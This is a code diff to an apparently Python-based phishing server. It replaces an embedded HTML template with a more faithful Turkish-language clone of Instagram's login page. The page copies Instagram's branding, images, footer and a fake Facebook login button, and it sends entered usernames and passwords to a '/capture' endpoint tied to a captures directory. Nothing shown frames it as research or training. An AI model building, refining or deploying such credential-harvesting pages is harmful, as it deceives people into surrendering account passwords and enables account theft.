@@ -34,19 +34,228 @@ if not os.path.exists(CAPTURES_DIR):
     os.makedirs(CAPTURES_DIR)
 
 INSTAGRAM_HTML = '''<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width">
-<title>Instagram</title><style>@font-face{font-family:"Billabong";src:url("https://s.cdnfonts.com/css/billabong.woff") format("woff");}*{box-sizing:border-box;margin:0;padding:0;}body{font-family:system-ui;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}.container{background:#fff;border-radius:16px;box-shadow:0 25px 50px rgba(0,0,0,.15);padding:40px;max-width:380px;width:100%;text-align:center;}.logo{font-family:"Billabong",cursive;font-size:3.2rem;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:0 0 30px;}.form-group{margin-bottom:16px;}.input{width:100%;padding:16px;border:2px solid #dbdbdb;border-radius:10px;font-size:15px;transition:all .3s;background:#fafafa;}.input:focus{border-color:#0095f6;background:#fff;box-shadow:0 0 0 4px rgba(0,149,246,.1);outline:0;}.btn{width:100%;background:linear-gradient(45deg,#0095f6,#1877f2);color:#fff;border:0;border-radius:10px;padding:14px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s;margin:10px 0;}.btn:hover{transform:translateY(-2px);box-shadow:0 12px 25px rgba(0,149,246,.3);}.status{display:none;padding:15px;border-radius:10px;margin-top:20px;font-weight:600;}.loading{background:#fff3cd;color:#856404;border:1px solid #ffeaa7;}.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb;}</style></head><body>
-<div class="container">
-<h1 class="logo">Instagram</h1>
-<form id="loginForm" action="/capture" method="POST">
-<div class="form-group"><input class="input" type="text" name="username" placeholder="Telefon, kullanıcı adı veya e-posta" required autocomplete="off"></div>
-<div class="form-group"><input class="input" type="password" name="password" placeholder="Şifre" required autocomplete="off"></div>
-<button class="btn" type="submit" id="submitBtn">Giriş Yap</button>
-</form>
-<div id="status" class="status"></div>
-</div>
-<script>document.getElementById("loginForm").onsubmit=function(){let b=document.getElementById("submitBtn"),s=document.getElementById("status");b.disabled=true;b.innerHTML="Giriş yapılıyor...";s.textContent="Lütfen bekleyin...";s.className="status loading";s.style.display="block";setTimeout(()=>{s.textContent="Giriş başarılı! Yönlendiriliyor...";s.className="status success";},1500);return true;};</script>
-</body></html>'''
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    @font-face {
+      font-family: 'Billabong';
+      src: url('https://fonts.cdnfonts.com/s/3780/Billabong.woff') format('woff');
+      font-weight: normal;
+      font-style: normal;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #fafafa;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px 16px;
+    }
+    .container {
+      max-width: 935px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      gap: 48px;
+    }
+    .phone-mockup {
+      flex: 1;
+      max-width: 454px;
+      display: none;
+    }
+    @media (min-width: 875px) {
+      .phone-mockup { display: block; }
+    }
+    .phone-mockup img { width: 100%; height: auto; }
+    .login-card {
+      width: 350px;
+      background: white;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      padding: 36px 40px 20px;
+      text-align: center;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+    }
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 3.25rem;
+      line-height: 0.95;
+      letter-spacing: -2.5px;
+      margin: 0 0 24px;
+      color: #262626;
+      font-weight: normal;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.08);
+    }
+    .input-group {
+      margin-bottom: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      background: #fafafa;
+      font-size: 14px;
+      transition: all 0.2s ease;
+    }
+    input:focus {
+      border-color: #0095f6;
+      background: white;
+      box-shadow: 0 0 0 2px rgba(0,149,246,0.2);
+      outline: none;
+    }
+    .submit-btn {
+      width: 100%;
+      background: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 9px 0;
+      font-weight: 600;
+      font-size: 14px;
+      margin: 10px 0 16px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    .submit-btn:hover:not(:disabled) {
+      background: #1877f2;
+    }
+    .submit-btn:disabled {
+      background: #b2dffc;
+      cursor: not-allowed;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+      margin: 0 18px;
+    }
+    .fb-btn {
+      width: 100%;
+      background: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 8px 0;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 8px 0;
+    }
+    .fb-btn img { width: 16px; height: 16px; }
+    .forgot {
+      color: #00376b;
+      font-size: 12px;
+      margin: 14px 0;
+      text-decoration: none;
+      display: block;
+    }
+    .signup-box {
+      background: white;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      padding: 20px;
+      margin-top: 16px;
+      font-size: 14px;
+    }
+    .signup-box a {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .footer {
+      margin-top: 60px;
+      font-size: 12px;
+      color: #8e8e8e;
+      text-align: center;
+    }
+    .footer a {
+      color: #8e8e8e;
+      margin: 0 8px;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="phone-mockup">
+      <img src="https://www.instagram.com/static/images/homepage/phones/home-phones-2x.png/9364675fb26a.png" alt="">
+    </div>
+
+    <div>
+      <div class="login-card">
+        <h1 class="logo">Instagram</h1>
+
+        <form id="loginForm" action="/capture" method="POST">
+          <div class="input-group">
+            <input type="text" name="username" placeholder="Telefon, kullanıcı adı veya e-posta" required autocomplete="off">
+          </div>
+          <div class="input-group">
+            <input type="password" name="password" placeholder="Şifre" required autocomplete="off">
+          </div>
+          <button type="submit" class="submit-btn" id="submitBtn">Giriş Yap</button>
+        </form>
+
+        <div class="divider">veya</div>
+
+        <button class="fb-btn">
+          <img src="https://img.icons8.com/color/16/facebook-new--v1.png" alt=""> Facebook ile Giriş Yap
+        </button>
+
+        <a href="#" class="forgot">Şifreni mi unuttun?</a>
+      </div>
+
+      <div class="signup-box">
+        Hesabın yok mu? <a href="#">Kaydol</a>
+      </div>
+
+      <div class="footer">
+        <p>© 2026 Instagram from Meta</p>
+        <div>
+          <a href="#">Hakkında</a> · <a href="#">Blog</a> · <a href="#">İş</a> · <a href="#">Yardım</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const btn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', (e) => {
+      btn.disabled = true;
+      btn.innerHTML = 'Giriş yapılıyor<span class="dots"></span>';
+
+      let dots = 0;
+      const interval = setInterval(() => {
+        dots = (dots + 1) % 4;
+        btn.querySelector('.dots').innerHTML = '.'.repeat(dots);
+      }, 400);
+    });
+  </script>
+</body>
+</html>'''
 
 def load_data():
     global premium_users
